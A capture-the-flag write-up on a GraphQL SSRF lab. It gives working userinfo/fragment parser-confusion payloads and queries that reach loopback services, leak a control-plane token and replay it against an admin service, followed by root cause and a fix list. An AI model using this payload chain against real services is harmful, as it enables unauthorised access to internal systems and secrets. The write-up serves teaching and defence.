# SecondQL GraphQL SSRF Parser Confusion

## What Is Happening

The lab exposes a GraphQL endpoint with a `file(id, service)` resolver. The resolver uses the user-controlled `service` parameter to build an upstream HTTP request for file retrieval.

The `service` value can be shaped as:

```text
pwnbox.io@127.0.0.1:8001#
```

This creates an SSRF primitive. The request reaches an internal loopback service, and GraphQL error messages leak the upstream response body.

## Why It Happens

The vulnerability is a URL parser confusion issue.

Likely behavior:

- Validation accepts the value because it contains or appears related to `pwnbox.io`.
- The HTTP executor treats `pwnbox.io` as userinfo and connects to `127.0.0.1`.
- The fragment marker `#` prevents the backend-appended `/api/files/` path from affecting the internal request path.
- The resolver includes upstream response bodies in GraphQL error messages when parsing fails.

That turns a server-side request bug into a readable internal service oracle.

## Exact Test

Prove internal service reachability:

```graphql
query MyQuery {
  file(id: "", service: "pwnbox.io@127.0.0.1:8001#") {
    id
  }
}
```

Expected signal:

```text
upstream 200 ... body: OpenAPI 3.1
```

Fetch the internal OpenAPI document:

```graphql
query MyQuery {
  file(id: "", service: "pwnbox.io@127.0.0.1:8001/openapi.json#") {
    id
  }
}
```

The OpenAPI output reveals:

```text
/_sentinel/keys.json
```

Fetch the internal sentinel state:

```graphql
query MyQuery {
  file(id: "", service: "pwnbox.io@127.0.0.1:8001/_sentinel/keys.json#") {
    id
  }
}
```

The response reveals a master token and explains how to use it:

```text
Basic Auth
username = any value
password = token
admin service = localhost:8003
```

Use the token against the admin service through the same SSRF primitive:

```graphql
query MyQuery {
  file(id: "", service: "pwnbox.io@admin:pat_3cf63a4202d0227085324370@127.0.0.1:8003#") {
    id
  }
}
```

## Expected Signal

The final GraphQL error includes:

```text
pwnbox{7fa64ecb47cb54fece17c58a7105487d}
```

## Result Interpretation

Confirmed chain:

```text
GraphQL service parameter
-> URL userinfo / fragment parser confusion
-> loopback SSRF to contacts service
-> OpenAPI disclosure
-> sentinel control-plane token disclosure
-> Basic Auth replay to admin service
-> flag disclosure
```

## Root Cause

The root issue is inconsistent URL parsing between validation and execution. The application did not validate the canonical destination that the HTTP client actually connected to.

A second issue amplified impact: GraphQL error handling exposed internal upstream response bodies.

## Impact

The GraphQL endpoint can be used to read loopback-only services. Internal documentation and control-plane secrets are exposed, allowing authentication to the admin service and access to privileged data.

## Fix

- Treat `service` as an identifier, not a raw URL authority. Map allowed service names to fixed backend URLs server-side.
- If URLs must be accepted, parse once, normalize, and validate the exact final URL before execution.
- Reject userinfo, fragments, encoded separators, backslashes, and ambiguous host syntax.
- Resolve DNS and block loopback, private, link-local, and metadata ranges.
- Disable redirect following or revalidate every redirect destination.
- Remove upstream bodies from GraphQL error messages.
- Remove super-tokens from internal HTTP routes and rotate exposed credentials.
- Add negative tests for `allowed.com@127.0.0.1`, fragments, encoded slashes, IPv6 loopback, decimal/octal/hex IPs, and redirects.

## Key Lesson

For SSRF, compare what the validator sees with what the executor connects to. The payload is only evidence after the final socket destination and response behavior are understood.
